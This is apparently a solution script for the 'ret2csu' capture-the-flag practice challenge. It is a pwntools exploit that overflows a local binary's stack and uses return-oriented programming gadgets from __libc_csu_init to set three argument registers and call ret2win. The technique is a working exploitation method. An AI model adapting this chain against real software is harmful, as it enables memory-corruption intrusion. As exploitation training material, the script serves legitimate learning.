#!/usr/bin/env python
from pwn import * 
import struct
import binascii


# 0000000000400640 <__libc_csu_init>:
#   400640:       41 57                   push   r15
#   400642:       41 56                   push   r14
#   400644:       49 89 d7                mov    r15,rdx
#   400647:       41 55                   push   r13
#   400649:       41 54                   push   r12
#   40064b:       4c 8d 25 9e 07 20 00    lea    r12,[rip+0x20079e]        # 600df0 <__frame_dummy_init_array_entry>
#   400652:       55                      push   rbp
#   400653:       48 8d 2d 9e 07 20 00    lea    rbp,[rip+0x20079e]        # 600df8 <__do_global_dtors_aux_fini_array_entry>
#   40065a:       53                      push   rbx
#   40065b:       41 89 fd                mov    r13d,edi
#   40065e:       49 89 f6                mov    r14,rsi
#   400661:       4c 29 e5                sub    rbp,r12
#   400664:       48 83 ec 08             sub    rsp,0x8
#   400668:       48 c1 fd 03             sar    rbp,0x3
#   40066c:       e8 5f fe ff ff          call   4004d0 <_init>
#   400671:       48 85 ed                test   rbp,rbp
#   400674:       74 20                   je     400696 <__libc_csu_init+0x56>
#   400676:       31 db                   xor    ebx,ebx
#   400678:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
#   40067f:       00
#   400680:       4c 89 fa                mov    rdx,r15
#   400683:       4c 89 f6                mov    rsi,r14
#   400686:       44 89 ef                mov    edi,r13d
#   400689:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#   40068d:       48 83 c3 01             add    rbx,0x1
#   400691:       48 39 dd                cmp    rbp,rbx
#   400694:       75 ea                   jne    400680 <__libc_csu_init+0x40>
#   400696:       48 83 c4 08             add    rsp,0x8
#   40069a:       5b                      pop    rbx
#   40069b:       5d                      pop    rbp
#   40069c:       41 5c                   pop    r12
#   40069e:       41 5d                   pop    r13
#   4006a0:       41 5e                   pop    r14
#   4006a2:       41 5f                   pop    r15
#   4006a4:       c3                      ret
#   4006a5:       90                      nop
#   4006a6:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
#   4006ad:       00 00 00

bin_name = './ret2csu'

context.clear(arch='amd64')
context.log_level = 'debug'
proc = process(bin_name)

padding_len       = 40

pop_rdi = 0x4006a3 # pop rdi; ret;
pop_rsi = 0x4006a1 # pop rsi; pop r15; ret;
pop_r12 = 0x40069c # pop r12; pop r13; pop r14; pop r15; ret;
pop_rbx = 0x40069a # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;

ret2win = 0x400510 # sym.imp.ret2win

csu_init_loop = 0x400680

csu_init_ptr = 0x600df8

payload  = padding_len * b'A'

payload += p64(pop_rbx) # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
payload += p64(csu_init_ptr // 8 - 8) # ^ pop rbx;
payload += p64(csu_init_ptr // 8 - 8 + 1) # ^ pop rbp;
payload += p64(0x38) # ^ pop r12;
payload += p64(0xff) # ^ pop r13;
payload += p64(0xff) # ^ pop r14;
payload += p64(0xd00df00dd00df00d) # ^ pop r15

payload += p64(csu_init_loop) # mov rdx, r15
payload += p64(0xff) # ^ pop rbx;
payload += p64(0xff) # ^ pop rbp;
payload += p64(0x38) # ^ pop r12;
payload += p64(0xff) # ^ pop r13;
payload += p64(0xff) # ^ pop r14;
payload += p64(0xdeadbeef) # ^ pop r15;
payload += p64(0xdeadbeef) # ^ random padding, idk numbers are hard sometimes

payload += p64(pop_rdi) # pop rdi; ret;
payload += p64(0xdeadbeefdeadbeef) # ^ pop rdi

payload += p64(pop_rsi) # pop rsi; pop r15; ret;
payload += p64(0xcafebabecafebabe) # ^ pop rsi
payload += p64(0xff) # ^ pop r15

payload += p64(ret2win) # pop rdi; ret;

proc.recvuntil('\n> ')
proc.sendline(payload)
log.info('payload: ' + binascii.hexlify(payload).decode('ascii'))
print(proc.recvall().decode('ascii'))
